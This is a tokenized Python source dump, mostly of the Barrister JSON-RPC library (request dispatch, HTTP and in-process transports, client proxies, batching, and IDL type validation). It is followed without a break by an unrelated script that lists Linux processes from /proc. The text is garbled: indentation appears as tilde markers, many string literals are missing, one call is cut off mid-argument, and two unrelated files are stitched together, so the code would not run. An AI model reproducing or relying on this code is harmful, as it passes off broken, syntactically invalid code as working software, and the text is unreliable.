~~~ raise RpcException ( ERR_INVALID_REQ , "Unknown interface: \'%s\'" % iface_name ) \n 
\n 
~~ ~~ def set_filters ( self , filters ) : \n 
~~~ """\n        Sets the filters for the server.\n\n        :Parameters:\n          filters\n            List of filters to set on this server, or None to remove all filters.\n            Elements in list should subclass Filter\n        """ \n 
if filters is None or isinstance ( filters , ( tuple , list ) ) : \n 
~~~ self . filters = filters \n 
~~ else : \n 
~~~ self . filters = [ filters ] \n 
\n 
~~ ~~ def call_json ( self , req_json , props = None ) : \n 
~~~ """\n        Deserializes req_json as JSON, invokes self.call(), and serializes result to JSON.\n        Returns JSON encoded string.\n\n        :Parameters:\n          req_json\n            JSON-RPC request serialized as JSON string\n          props\n            Application defined properties to set on RequestContext for use with filters.\n            For example: authentication headers.  Must be a dict.\n        """ \n 
try : \n 
~~~ req = json . loads ( req_json ) \n 
~~ except Exception as e : \n 
~~~ msg = "Unable to parse JSON: %s" % req_json \n 
return json . dumps ( err_response ( None , - 32700 , msg ) ) \n 
~~ return json . dumps ( self . call ( req , props ) ) \n 
\n 
~~ def call ( self , req , props = None ) : \n 
~~~ """\n        Executes a Barrister request and returns a response.  If the request is a list, then the\n        response will also be a list.  If the request is an empty list, a RpcException is raised.\n\n        :Parameters:\n          req\n            The request. Either a list of dicts, or a single dict.\n          props\n            Application defined properties to set on RequestContext for use with filters.\n            For example: authentication headers.  Must be a dict.\n        """ \n 
resp = None \n 
\n 
if self . log . isEnabledFor ( logging . DEBUG ) : \n 
~~~ self . log . debug ( "Request: %s" % str ( req ) ) \n 
\n 
~~ if isinstance ( req , list ) : \n 
~~~ if len ( req ) < 1 : \n 
~~~ resp = err_response ( None , ERR_INVALID_REQ , "Invalid Request. Empty batch." ) \n 
~~ else : \n 
# run the batch call collecting the responses \n 
~~~ resp = [ self . _call_and_format ( r , props ) for r in req ] \n 
~~ ~~ else : \n 
~~~ resp = self . _call_and_format ( req , props ) \n 
\n 
~~ if self . log . isEnabledFor ( logging . DEBUG ) : \n 
~~~ self . log . debug ( "Response: %s" % str ( resp ) ) \n 
~~ return resp \n 
\n 
~~ def _call_and_format ( self , req , props = None ) : \n 
~~~ """\n        Invokes a single request against a handler using _call() and traps any errors,\n        formatting them using _err().  If the request is successful it is wrapped in a\n        JSON-RPC 2.0 compliant dict with keys: \'jsonrpc\', \'id\', \'result\'.\n\n        :Parameters:\n          req\n            A single dict representing a single JSON-RPC request\n          props\n            Application defined properties to set on RequestContext for use with filters.\n            For example: authentication headers.  Must be a dict.\n        """ \n 
if not isinstance ( req , dict ) : \n 
~~~ return err_response ( None , ERR_INVALID_REQ , \n 
"Invalid Request. %s is not an object." % str ( req ) ) \n 
\n 
~~ reqid = None \n 
if "id" in req : \n 
~~~ reqid = req [ "id" ] \n 
\n 
~~ if props is None : \n 
~~~ props = { } \n 
~~ context = RequestContext ( props , req ) \n 
\n 
if self . filters : \n 
~~~ for f in self . filters : \n 
~~~ f . pre ( context ) \n 
\n 
~~ ~~ if context . error : \n 
~~~ return context . error \n 
\n 
~~ resp = None \n 
try : \n 
~~~ result = self . _call ( context ) \n 
resp = { "jsonrpc" : "2.0" , "id" : reqid , "result" : result } \n 
~~ except RpcException as e : \n 
~~~ resp = err_response ( reqid , e . code , e . msg , e . data ) \n 
~~ except Exception as e : \n 
~~~ self . log . exception ( "Error processing request: %s" % str ( req ) ) \n 
resp = err_response ( reqid , ERR_UNKNOWN , "Server error. Check logs for details." , \n 
data = { \n 
: str ( e ) \n 
} ) \n 
\n 
~~ if self . filters : \n 
~~~ context . response = resp \n 
for f in self . filters : \n 
~~~ f . post ( context ) \n 
\n 
~~ ~~ return resp \n 
\n 
~~ def _call ( self , context ) : \n 
~~~ """\n        Executes a single request against a handler.  If the req.method == \'common.barrister-idl\', the\n        Contract IDL JSON structure is returned.  Otherwise the method is resolved to a handler\n        based on the interface name, and the appropriate function is called on the handler.\n\n        :Parameter:\n          req\n            A dict representing a valid JSON-RPC 2.0 request.  \'method\' must be provided.\n        """ \n 
req = context . request \n 
if "method" not in req : \n 
~~~ raise RpcException ( ERR_INVALID_REQ , "Invalid Request. No \'method\'." ) \n 
\n 
~~ method = req [ "method" ] \n 
\n 
if method == "common.barrister-idl" or method == "getIdl" : \n 
~~~ return self . contract . idl_parsed \n 
\n 
~~ iface_name , func_name = unpack_method ( method ) \n 
\n 
if iface_name in self . handlers : \n 
~~~ iface_impl = self . handlers [ iface_name ] \n 
func = getattr ( iface_impl , func_name ) \n 
if func : \n 
~~~ if "params" in req : \n 
~~~ params = req [ "params" ] \n 
~~ else : \n 
~~~ params = [ ] \n 
\n 
~~ if self . validate_req : \n 
~~~ self . contract . validate_request ( iface_name , func_name , params ) \n 
\n 
~~ if hasattr ( iface_impl , "barrister_pre" ) : \n 
~~~ pre_hook = getattr ( iface_impl , "barrister_pre" ) \n 
pre_hook ( context , params ) \n 
\n 
~~ if params : \n 
~~~ result = func ( * params ) \n 
~~ else : \n 
~~~ result = func ( ) \n 
\n 
~~ if self . validate_resp : \n 
~~~ self . contract . validate_response ( iface_name , func_name , result ) \n 
~~ return result \n 
~~ else : \n 
~~~ msg = "Method \'%s\' not found" % method \n 
raise RpcException ( ERR_METHOD_NOT_FOUND , msg ) \n 
~~ ~~ else : \n 
~~~ msg = "No implementation of \'%s\' found" % iface_name \n 
raise RpcException ( ERR_METHOD_NOT_FOUND , msg ) \n 
\n 
\n 
~~ ~~ ~~ class HttpTransport ( object ) : \n 
~~~ """\n    A client transport that uses urllib2 to make requests against a HTTP server.\n    """ \n 
\n 
def __init__ ( self , url , handlers = None , headers = None ) : \n 
~~~ """\n        Creates a new HttpTransport\n\n        :Parameters:\n          url\n            URL of the server endpoint\n          handlers\n            Optional list of handlers to pass to urllib2.build_opener()\n          headers\n            Optional list of HTTP headers to set on requests.  Note that Content-Type will always be set\n            automatically to "application/json"\n        """ \n 
if not headers : \n 
~~~ headers = { } \n 
~~ headers [ ] = \n 
self . url = url \n 
self . headers = headers \n 
if handlers : \n 
~~~ self . opener = urllib . request . build_opener ( * handlers ) \n 
~~ else : \n 
~~~ self . opener = urllib . request . build_opener ( ) \n 
\n 
~~ ~~ def request ( self , req ) : \n 
~~~ """\n        Makes a request against the server and returns the deserialized result.\n\n        :Parameters:\n          req\n            List or dict representing a JSON-RPC formatted request\n        """ \n 
data = json . dumps ( req ) \n 
req = urllib . request . Request ( self . url , data , self . headers ) \n 
f = self . opener . open ( req ) \n 
resp = f . read ( ) \n 
f . close ( ) \n 
return json . loads ( resp ) \n 
\n 
\n 
~~ ~~ class InProcTransport ( object ) : \n 
~~~ """\n    A client transport that invokes calls directly against a Server instance in process.\n    This is useful for quickly unit testing services without having to go over the network.\n    """ \n 
\n 
def __init__ ( self , server ) : \n 
~~~ """\n        Creates a new InProcTransport for the given Server\n\n        :Parameters:\n          server\n            Barrister Server instance to bind this transport to\n        """ \n 
self . server = server \n 
\n 
~~ def request ( self , req ) : \n 
~~~ """\n        Performs request against the given server.\n\n        :Parameters:\n          req\n            List or dict representing a JSON-RPC formatted request\n        """ \n 
return self . server . call ( req ) \n 
\n 
\n 
~~ ~~ class Client ( object ) : \n 
~~~ """\n    Main class for consuming a server implementation.  Given a transport it loads the IDL from\n    the server and creates proxy objects that can be called like local classes from your\n    application code.\n\n    With the exception of start_batch, you generally never need to use the methods provided by this\n    class directly.\n\n    For example:\n\n    ::\n\n      client = common.barrister.Client(common.barrister.HttpTransport("http://localhost:8080/OrderManagement"))\n      status = client.OrderService.getOrderStatus("order-123")\n\n    """ \n 
\n 
def __init__ ( self , transport , validate_request = True , validate_response = True , \n 
id_gen = idgen_uuid ) : \n 
~~~ """\n        Creates a new Client for the given transport. When the constructor is called the\n        client immediately makes a request to the server to load the IDL.  It then creates\n        proxies for each interface in the IDL.  After constructing a client you can immediately\n        begin making requests against the proxies.\n\n        :Parameters:\n          transport\n            Transport object to use to make requests\n          validate_request\n            If True, the request will be validated against the Contract and a RpcException raised if\n            it does not match the IDL\n          validate_response\n            If True, the response will be validated against the Contract and a RpcException raised if\n            it does not match the IDL\n          id_gen\n            A callable to use to create request IDs.  JSON-RPC request IDs are only used by Barrister\n            to correlate requests with responses when using a batch, but your application may use them\n            for logging or other purposes.  UUIDs are used by default, but you can substitute another\n            function if you prefer something shorter.\n        """ \n 
logging . basicConfig ( ) \n 
self . log = logging . getLogger ( "common.barrister" ) \n 
self . transport = transport \n 
self . validate_req = validate_request \n 
self . validate_resp = validate_response \n 
self . id_gen = id_gen \n 
req = { "jsonrpc" : "2.0" , "method" : "common.barrister-idl" , "id" : "1" } \n 
resp = transport . request ( req ) \n 
self . contract = Contract ( resp [ "result" ] ) \n 
for k , v in list ( self . contract . interfaces . items ( ) ) : \n 
~~~ setattr ( self , k , InterfaceClientProxy ( self , v ) ) \n 
\n 
~~ ~~ def get_meta ( self ) : \n 
~~~ """\n        Returns the dict of metadata from the Contract\n        """ \n 
return self . contract . meta \n 
\n 
~~ def call ( self , iface_name , func_name , params ) : \n 
~~~ """\n        Makes a single RPC request and returns the result.\n\n        :Parameters:\n          iface_name\n            Interface name to call\n          func_name\n            Function to call on the interface\n          params\n            List of parameters to pass to the function\n        """ \n 
req = self . to_request ( iface_name , func_name , params ) \n 
if self . log . isEnabledFor ( logging . DEBUG ) : \n 
~~~ self . log . debug ( "Request: %s" % str ( req ) ) \n 
~~ resp = self . transport . request ( req ) \n 
if self . log . isEnabledFor ( logging . DEBUG ) : \n 
~~~ self . log . debug ( "Response: %s" % str ( resp ) ) \n 
~~ return self . to_result ( iface_name , func_name , resp ) \n 
\n 
~~ def to_request ( self , iface_name , func_name , params ) : \n 
~~~ """\n        Converts the arguments to a JSON-RPC request dict.  The \'id\' field is populated\n        using the id_gen function passed to the Client constructor.\n\n        If validate_request==True on the Client constructor, the params are validated\n        against the expected types for the function and a RpcException raised if they are\n        invalid.\n\n        :Parameters:\n          iface_name\n            Interface name to call\n          func_name\n            Function to call on the interface\n          params\n            List of parameters to pass to the function\n        """ \n 
if self . validate_req : \n 
~~~ self . contract . validate_request ( iface_name , func_name , params ) \n 
\n 
~~ method = "%s.%s" % ( iface_name , func_name ) \n 
reqid = self . id_gen ( ) \n 
return { "jsonrpc" : "2.0" , "id" : reqid , "method" : method , "params" : params } \n 
\n 
~~ def to_result ( self , iface_name , func_name , resp ) : \n 
~~~ """\n        Takes a JSON-RPC response and checks for an "error" slot. If it exists,\n        a RpcException is raised.  If no "error" slot exists, the "result" slot is\n        returned.\n\n        If validate_response==True on the Client constructor, the result is validated\n        against the expected return type for the function and a RpcException raised if it is\n        invalid.\n\n        :Parameters:\n          iface_name\n            Interface name that was called\n          func_name\n            Function that was called on the interface\n          resp\n            Dict formatted as a JSON-RPC response\n        """ \n 
if "error" in resp : \n 
~~~ e = resp [ "error" ] \n 
data = None \n 
if "data" in e : \n 
~~~ data = e [ "data" ] \n 
~~ raise RpcException ( e [ "code" ] , e [ "message" ] , data ) \n 
\n 
~~ result = resp [ "result" ] \n 
\n 
if self . validate_resp : \n 
~~~ self . contract . validate_response ( iface_name , func_name , result ) \n 
~~ return result \n 
\n 
~~ def start_batch ( self ) : \n 
~~~ """\n        Returns a new Batch object for the Client that can be used to make multiple RPC calls\n        in a single request.\n        """ \n 
return Batch ( self ) \n 
\n 
\n 
~~ ~~ class InterfaceClientProxy ( object ) : \n 
~~~ """\n    Internal class used by the Client.  One instance is created per Client per interface found\n    on the IDL returned from the server.\n    """ \n 
\n 
def __init__ ( self , client , iface ) : \n 
~~~ """\n        Creates a new InterfaceClientProxy\n\n        :Parameters:\n          client\n            Client instance to associate with this proxy\n          iface\n            Dict interface from the parsed IDL.  All functions defined on this interface will\n            be defined on this proxy class as callables.\n        """ \n 
self . client = client \n 
iface_name = iface . name \n 
for func_name , func in list ( iface . functions . items ( ) ) : \n 
~~~ setattr ( self , func_name , self . _caller ( iface_name , func_name ) ) \n 
\n 
~~ ~~ def _caller ( self , iface_name , func_name ) : \n 
~~~ """\n        Returns a function for the given interface and function name.  When invoked it\n        calls client.call() with the correct arguments.\n\n        :Parameters:\n          iface_name\n            Name of interface to call when invoked\n          func_name\n            Name of function to call when invoked\n          params\n            Params pass to function from the calling application\n        """ \n 
\n 
def caller ( * params ) : \n 
~~~ return self . client . call ( iface_name , func_name , params ) \n 
\n 
~~ return caller \n 
\n 
\n 
~~ ~~ class Batch ( object ) : \n 
~~~ """\n    Provides a way to batch requests together in a single call.  This class functions\n    similiarly to the Client class.  InterfaceClientProxy instances are attached to the Batch\n    instance, but when the application code calls them, the params are stored in memory until\n    `batch.send()` is called.\n    """ \n 
\n 
def __init__ ( self , client ) : \n 
~~~ """\n        Creates a new Batch for the given Client instance.  Rarely called directly.  Use\n        client.start_batch() instead.\n\n        :Parameters:\n          client\n            Client instance to associate with this Batch\n        """ \n 
self . client = client \n 
self . req_list = [ ] \n 
self . sent = False \n 
for k , v in list ( client . contract . interfaces . items ( ) ) : \n 
~~~ setattr ( self , k , InterfaceClientProxy ( self , v ) ) \n 
\n 
~~ ~~ def call ( self , iface_name , func_name , params ) : \n 
~~~ """\n        Implements the call() function with same signature as Client.call().  Raises\n        a RpcException if send() has already been called on this batch.  Otherwise\n        appends the request to an internal list.\n\n        This method is not commonly called directly.\n        """ \n 
if self . sent : \n 
~~~ raise Exception ( "Batch already sent. Cannot add more calls." ) \n 
~~ else : \n 
~~~ req = self . client . to_request ( iface_name , func_name , params ) \n 
self . req_list . append ( req ) \n 
\n 
~~ ~~ def send ( self ) : \n 
~~~ """\n        Sends the batch request to the server and returns a list of RpcResponse\n        objects.  The list will be in the order that the requests were made to\n        the batch.  Note that the RpcResponse objects may contain an error or a\n        successful result.  When you iterate through the list, you must test for\n        response.error.\n\n        send() may not be called more than once.\n        """ \n 
if self . sent : \n 
~~~ raise Exception ( "Batch already sent. Cannot send() again." ) \n 
~~ else : \n 
~~~ self . sent = True \n 
results = self . client . transport . request ( self . req_list ) \n 
\n 
id_to_method = { } \n 
by_id = { } \n 
for res in results : \n 
~~~ reqid = res [ "id" ] \n 
by_id [ reqid ] = res \n 
\n 
~~ in_req_order = [ ] \n 
for req in self . req_list : \n 
~~~ reqid = req [ "id" ] \n 
result = None \n 
error = None \n 
resp = safe_get ( by_id , reqid ) \n 
if resp is None : \n 
~~~ msg = "Batch response missing result for request id: %s" % reqid \n 
error = RpcException ( ERR_INVALID_RESP , msg ) \n 
~~ else : \n 
~~~ r_err = safe_get ( resp , "error" ) \n 
if r_err is None : \n 
~~~ result = resp [ "result" ] \n 
~~ else : \n 
~~~ error = RpcException ( r_err [ "code" ] , r_err [ "message" ] , safe_get ( r_err , "data" ~~ ~~ in_req_order . append ( RpcResponse ( req , result , error ) ) \n 
~~ return in_req_order \n 
\n 
\n 
~~ ~~ ~~ class RpcResponse ( object ) : \n 
~~~ """\n    Represents a single response in a batch call.  Has the following properties:\n\n    * `request` - JSON-RPC request dict\n    * `result`  - Result from this call. Set to None if there was an error.\n    * `error`   - RpcException instance.  Set to None if call was successful.\n    """ \n 
\n 
def __init__ ( self , request , result , error ) : \n 
~~~ self . request = request \n 
self . result = result \n 
self . error = error \n 
\n 
\n 
~~ ~~ class Contract ( object ) : \n 
~~~ """\n    Represents a single IDL file\n    """ \n 
\n 
def __init__ ( self , idl_parsed ) : \n 
~~~ """\n        Creates a new Contract from the parsed IDL JSON\n\n        :Parameters:\n          idl_parsed\n            Barrister parsed IDL as a list of dicts\n        """ \n 
self . idl_parsed = idl_parsed \n 
self . interfaces = { } \n 
self . structs = { } \n 
self . enums = { } \n 
self . meta = { } \n 
for e in idl_parsed : \n 
~~~ if e [ "type" ] == "struct" : \n 
~~~ self . structs [ e [ "name" ] ] = Struct ( e , self ) \n 
~~ elif e [ "type" ] == "enum" : \n 
~~~ self . enums [ e [ "name" ] ] = Enum ( e ) \n 
~~ elif e [ "type" ] == "interface" : \n 
~~~ self . interfaces [ e [ "name" ] ] = Interface ( e , self ) \n 
~~ elif e [ "type" ] == "meta" : \n 
~~~ for k , v in list ( e . items ( ) ) : \n 
~~~ if k != "type" : \n 
~~~ self . meta [ k ] = v \n 
\n 
~~ ~~ ~~ ~~ ~~ def validate_request ( self , iface_name , func_name , params ) : \n 
~~~ """\n        Validates that the given params match the expected length and types for this\n        interface and function.\n\n        Returns two element tuple: (bool, string)\n\n        - `bool` - True if valid, False if not\n        - `string` - Description of validation error, or None if valid\n\n        :Parameters:\n          iface_name\n            Name of interface\n          func_name\n            Name of function\n          params\n            List of params to validate against this function\n        """ \n 
self . interface ( iface_name ) . function ( func_name ) . validate_params ( params ) \n 
\n 
~~ def validate_response ( self , iface_name , func_name , resp ) : \n 
~~~ """\n        Validates that the response matches the return type for the function\n\n        Returns two element tuple: (bool, string)\n\n        - `bool` - True if valid, False if not\n        - `string` - Description of validation error, or None if valid\n\n        :Parameters:\n          iface_name\n            Name of interface\n          func_name\n            Name of function\n          resp\n            Result from calling the function\n        """ \n 
self . interface ( iface_name ) . function ( func_name ) . validate_response ( resp ) \n 
\n 
~~ def get ( self , name ) : \n 
~~~ """\n        Returns the struct, enum, or interface with the given name, or raises RpcException if\n        no elements match that name.\n\n        :Parameters:\n          name\n            Name of struct/enum/interface to return\n        """ \n 
if name in self . structs : \n 
~~~ return self . structs [ name ] \n 
~~ elif name in self . enums : \n 
~~~ return self . enums [ name ] \n 
~~ elif name in self . interfaces : \n 
~~~ return self . interfaces [ name ] \n 
~~ else : \n 
~~~ raise RpcException ( ERR_INVALID_PARAMS , "Unknown entity: \'%s\'" % name ) \n 
\n 
~~ ~~ def struct ( self , struct_name ) : \n 
~~~ """\n        Returns the struct with the given name, or raises RpcException if no struct matches\n        """ \n 
if struct_name in self . structs : \n 
~~~ return self . structs [ struct_name ] \n 
~~ else : \n 
~~~ raise RpcException ( ERR_INVALID_PARAMS , "Unknown struct: \'%s\'" , struct_name ) \n 
\n 
~~ ~~ def has_interface ( self , iface_name ) : \n 
~~~ """\n        Returns True if an interface exists with the given name.  Otherwise returns False\n        """ \n 
return iface_name in self . interfaces \n 
\n 
~~ def interface ( self , iface_name ) : \n 
~~~ """\n        Returns the interface with the given name, or raises RpcException if no interface matches\n        """ \n 
if self . has_interface ( iface_name ) : \n 
~~~ return self . interfaces [ iface_name ] \n 
~~ else : \n 
~~~ raise RpcException ( ERR_INVALID_PARAMS , "Unknown interface: \'%s\'" % iface_name ) \n 
\n 
~~ ~~ def validate ( self , expected_type , is_array , val ) : \n 
~~~ """\n        Validates that the expected type matches the value\n\n        Returns two element tuple: (bool, string)\n\n        - `bool` - True if valid, False if not\n        - `string` - Description of validation error, or None if valid\n\n        :Parameters:\n          expected_type\n            string name of the type expected. This may be a Barrister primitive, or a user defined type.\n          is_array\n            If True then require that the val be a list\n          val\n            Value to validate against the expected type\n        """ \n 
if val is None : \n 
~~~ if expected_type . optional : \n 
~~~ return True , None \n 
~~ else : \n 
~~~ return False , "Value cannot be null" \n 
~~ ~~ elif is_array : \n 
~~~ if not isinstance ( val , list ) : \n 
~~~ return self . _type_err ( val , "list" ) \n 
~~ else : \n 
~~~ for v in val : \n 
~~~ ok , msg = self . validate ( expected_type , False , v ) \n 
if not ok : \n 
~~~ return ok , msg \n 
~~ ~~ ~~ ~~ elif expected_type . type == "int" : \n 
~~~ if not isinstance ( val , int ) : \n 
~~~ return self . _type_err ( val , "int" ) \n 
~~ ~~ elif expected_type . type == "float" : \n 
~~~ if not isinstance ( val , ( float , int ) ) : \n 
~~~ return self . _type_err ( val , "float" ) \n 
~~ ~~ elif expected_type . type == "bool" : \n 
~~~ if not isinstance ( val , bool ) : \n 
~~~ return self . _type_err ( val , "bool" ) \n 
~~ ~~ elif expected_type . type == "string" : \n 
~~~ if not isinstance ( val , str ) : \n 
~~~ return self . _type_err ( val , "string" ) \n 
~~ ~~ else : \n 
~~~ return self . get ( expected_type . type ) . validate ( val ) \n 
~~ return True , None \n 
\n 
~~ def _type_err ( self , val , expected ) : \n 
~~~ return False , "\'%s\' is of type %s, expected %s" % ( val , type ( val ) , expected ) \n 
\n 
\n 
~~ ~~ class Interface ( object ) : \n 
~~~ """\n    Represents a Barrister IDL \'interface\' entity.\n    """ \n 
\n 
def __init__ ( self , iface , contract ) : \n 
~~~ """\n        Creates an Interface. Creates a \'functions\' list of Function objects for\n        each function defined on the interface.\n\n        :Parameters:\n          iface\n            Dict representing the interface (from parsed IDL)\n          contract\n            Contract instance to associate the interface instance with\n        """ \n 
self . name = iface [ "name" ] \n 
self . functions = { } \n 
for f in iface [ "functions" ] : \n 
~~~ self . functions [ f [ "name" ] ] = Function ( self . name , f , contract ) \n 
\n 
~~ ~~ def function ( self , func_name ) : \n 
~~~ """\n        Returns the Function instance associated with the given func_name, or raises a\n        RpcException if no function matches.\n        """ \n 
if func_name in self . functions : \n 
~~~ return self . functions [ func_name ] \n 
~~ else : \n 
~~~ raise RpcException ( ERR_METHOD_NOT_FOUND , \n 
"%s: Unknown function: \'%s\'" % ( self . name , func_name ) ) \n 
\n 
\n 
~~ ~~ ~~ class Enum ( object ) : \n 
~~~ """\n    Represents a Barrister IDL \'enum\' entity.\n    """ \n 
\n 
def __init__ ( self , enum ) : \n 
~~~ """\n        Creates an Enum.\n\n        :Parameters:\n          enum\n            Dict representing the enum (from parsed IDL)\n        """ \n 
self . name = enum [ "name" ] \n 
self . values = [ ] \n 
for v in enum [ "values" ] : \n 
~~~ self . values . append ( v [ "value" ] ) \n 
\n 
~~ ~~ def validate ( self , val ) : \n 
~~~ """\n        Validates that the val is in the list of values for this Enum.\n\n        Returns two element tuple: (bool, string)\n\n        - `bool` - True if valid, False if not\n        - `string` - Description of validation error, or None if valid\n\n        :Parameters:\n          val\n            Value to validate.  Should be a string.\n        """ \n 
if val in self . values : \n 
~~~ return True , None \n 
~~ else : \n 
~~~ return False , "\'%s\' is not in enum: %s" % ( val , str ( self . values ) ) \n 
\n 
\n 
~~ ~~ ~~ class Struct ( object ) : \n 
~~~ """\n    Represents a Barrister IDL \'struct\' entity.\n    """ \n 
\n 
def __init__ ( self , s , contract ) : \n 
~~~ """\n        Creates a Struct.\n\n        :Parameters:\n          s\n            Dict representing the struct (from parsed IDL)\n          contract\n            Contract instance to associate with the Struct\n        """ \n 
self . contract = contract \n 
self . name = s [ "name" ] \n 
self . extends = s [ "extends" ] \n 
self . parent = None \n 
self . fields = { } \n 
for f in s [ "fields" ] : \n 
~~~ self . fields [ f [ "name" ] ] = Type ( f ) \n 
\n 
~~ ~~ def field ( self , name ) : \n 
~~~ """\n        Returns the field on this struct with the given name. Will try to find this\n        name on all ancestors if this struct extends another.\n\n        If found, returns a dict with keys: \'name\', \'comment\', \'type\', \'is_array\'\n        If not found, returns None\n\n        :Parameters:\n          name\n            string name of field to lookup\n        """ \n 
if name in self . fields : \n 
~~~ return self . fields [ name ] \n 
~~ elif self . extends : \n 
~~~ if not self . parent : \n 
~~~ self . parent = self . contract . struct ( self . extends ) \n 
~~ return self . parent . field ( name ) \n 
~~ else : \n 
~~~ return None \n 
\n 
~~ ~~ def validate ( self , val ) : \n 
~~~ """\n        Validates that the val matches the expected fields for this struct.\n        val must be a dict, and must contain only fields represented by this struct and its\n        ancestors.\n\n        Returns two element tuple: (bool, string)\n\n        - `bool` - True if valid, False if not\n        - `string` - Description of validation error, or None if valid\n\n        :Parameters:\n          val\n            Value to validate.  Must be a dict\n        """ \n 
if type ( val ) is not dict : \n 
~~~ return False , "%s is not a dict" % ( str ( val ) ) \n 
\n 
~~ for k , v in list ( val . items ( ) ) : \n 
~~~ field = self . field ( k ) \n 
if field : \n 
~~~ ok , msg = self . contract . validate ( field , field . is_array , v ) \n 
if not ok : \n 
~~~ return False , "field \'%s\': %s" % ( field . name , msg ) \n 
~~ ~~ else : \n 
~~~ return False , "field \'%s\' not found in struct %s" % ( k , self . name ) \n 
\n 
~~ ~~ all_fields = self . get_all_fields ( [ ] ) \n 
for field in all_fields : \n 
~~~ if field . name not in val and not field . optional : \n 
~~~ return False , "field \'%s\' missing from: %s" % ( field . name , str ( val ) ) \n 
\n 
~~ ~~ return True , None \n 
\n 
~~ def get_all_fields ( self , arr ) : \n 
~~~ """\n        Returns a list containing this struct\'s fields and all the fields of\n        its ancestors.  Used during validation.\n        """ \n 
for k , v in list ( self . fields . items ( ) ) : \n 
~~~ arr . append ( v ) \n 
\n 
~~ if self . extends : \n 
~~~ parent = self . contract . get ( self . extends ) \n 
if parent : \n 
~~~ return parent . get_all_fields ( arr ) \n 
\n 
~~ ~~ return arr \n 
\n 
\n 
~~ ~~ class Function ( object ) : \n 
~~~ """\n    Represents a function defined on an Interface\n    """ \n 
\n 
def __init__ ( self , iface_name , f , contract ) : \n 
~~~ """\n        Creates a new Function\n\n        :Parameters:\n          iface_name\n            Name of interface this function belongs to\n          f\n            Dict from parsed IDL representing this function. keys: \'name\', \'params\', \'returns\'\n          contract\n            Contract to associate this Function with\n        """ \n 
self . contract = contract \n 
self . name = f [ "name" ] \n 
self . params = [ ] \n 
for p in f [ "params" ] : \n 
~~~ self . params . append ( Type ( p ) ) \n 
~~ self . returns = Type ( f [ "returns" ] ) if "returns" in f else None \n 
self . full_name = "%s.%s" % ( iface_name , self . name ) \n 
\n 
self . validate_structure ( ) \n 
\n 
~~ def validate_structure ( self ) : \n 
~~~ """\n        Sanity check of own properties. Raises InvaildFunctionErrors.\n        """ \n 
\n 
if self . name in [ None , ] : \n 
~~~ raise InvalidFunctionError ( \n 
\n 
) \n 
\n 
~~ if self . returns is None : \n 
~~~ raise InvalidFunctionError ( \n 
\'function definition "%s" is missing a return type\' % ( \n 
self . full_name \n 
) \n 
) \n 
\n 
~~ ~~ def validate_params ( self , params ) : \n 
~~~ """\n        Validates params against expected types for this function.\n        Raises RpcException if the params are invalid.\n        """ \n 
if params is not None : \n 
# check param lengths match \n 
~~~ if len ( self . params ) != len ( params ) : \n 
~~~ vals = ( self . full_name , len ( self . params ) , len ( params ) ) \n 
msg = "Function \'%s\' expects %d param(s). %d given." % vals \n 
raise RpcException ( ERR_INVALID_PARAMS , msg ) \n 
\n 
# compare each expected and given param \n 
~~ [ self . _validate_param ( x , y ) for ( x , y ) in zip ( self . params , params ) ] \n 
\n 
~~ ~~ def validate_response ( self , resp ) : \n 
~~~ """\n        Validates resp against expected return type for this function.\n        Raises RpcException if the response is invalid.\n        """ \n 
ok , msg = self . contract . validate ( self . returns , \n 
self . returns . is_array , resp ) \n 
if not ok : \n 
~~~ vals = ( self . full_name , str ( resp ) , msg ) \n 
msg = "Function \'%s\' invalid response: \'%s\'. %s" % vals \n 
raise RpcException ( ERR_INVALID_RESP , msg ) \n 
\n 
~~ ~~ def _validate_param ( self , expected , param ) : \n 
~~~ """\n        Validates a single param against its expected type.\n        Raises RpcException if the param is invalid\n\n        :Parameters:\n          expected\n            Type instance\n          param\n            Parameter value to validate\n        """ \n 
ok , msg = self . contract . validate ( expected , expected . is_array , param ) \n 
if not ok : \n 
~~~ vals = ( self . full_name , expected . name , msg ) \n 
msg = "Function \'%s\' invalid param \'%s\'. %s" % vals \n 
raise RpcException ( ERR_INVALID_PARAMS , msg ) \n 
\n 
\n 
~~ ~~ ~~ class Type ( object ) : \n 
~~~ def __init__ ( self , type_dict ) : \n 
~~~ self . name = "" \n 
self . optional = False \n 
if "name" in type_dict : \n 
~~~ self . name = type_dict [ "name" ] \n 
~~ self . type = type_dict [ "type" ] \n 
self . is_array = type_dict [ "is_array" ] \n 
if "optional" in type_dict : \n 
~~~ self . optional = type_dict [ "optional" ] \n 
#!/usr/bin/env python \n 
\n 
~~ ~~ ~~ import os \n 
import sys \n 
import re \n 
import json \n 
\n 
\n 
class CheckProcs ( object ) : \n 
~~~ myPid = 0 \n 
state = "" \n 
name = "" \n 
pid = 0 \n 
allProcs = [ ] \n 
interestingProcs = [ ] \n 
procDir = "/proc" \n 
debug = False \n 
\n 
def __init__ ( self ) : \n 
~~~ self . myPid = os . getpid ( ) \n 
\n 
~~ def setup ( self , debug = False , pidlist = False ) : \n 
~~~ self . debug = debug \n 
self . pidlist = pidlist \n 
\n 
if debug is True : \n 
~~~ print ( "Debug is on" ) \n 
\n 
~~ self . allProcs = [ procs for procs in os . listdir ( self . procDir ) if procs . isdigit ( ) and \n 
int ( procs ) != int ( self . myPid ) ] \n 
\n 
~~ def process ( self , criteria ) : \n 
~~~ for p in self . allProcs : \n 
~~~ try : \n 
~~~ fh = open ( self . procDir + "/" + p + "/stat" ) \n 
pInfo = fh . readline ( ) . split ( ) \n 
cmdfh = open ( self . procDir + "/" + p + "/cmdline" ) \n 
cmd = cmdfh . readline ( ) \n 
pInfo [ 1 ] = cmd \n 
~~ except : \n 
~~~ continue \n 
~~ finally : \n 
~~~ cmdfh . close ( ) \n 
fh . close ( ) \n 
\n 
~~ if criteria == : \n 
~~~ if pInfo [ 2 ] == self . state : \n 
~~~ self . interestingProcs . append ( pInfo ) \n 
~~ ~~ elif criteria == : \n 
~~~ if re . search ( self . name , pInfo [ 1 ] ) : \n 
~~~ self . interestingProcs . append ( pInfo ) \n 
~~ ~~ elif criteria == : \n 
~~~ if pInfo [ 0 ] == self . pid : \n 
~~~ self . interestingProcs . append ( pInfo ) \n 
\n 
~~ ~~ ~~ ~~ def byState ( self , state ) : \n 
~~~ self . state = state \n 
self . process ( criteria = ) \n 
self . show ( ) \n 
\n 
~~ def byPid ( self , pid ) : \n 
~~~ self . pid = pid \n 
self . process ( criteria = ) \n 
self . show ( ) \n 
\n 
~~ def byName ( self , name ) : \n 
~~~ self . name = name \n 
self . process ( criteria = ) \n 
self . show ( ) \n 
\n 
~~ def run ( self , foo , criteria ) : \n 
~~~ if foo == : \n 
~~~ self . byState ( criteria ) \n 
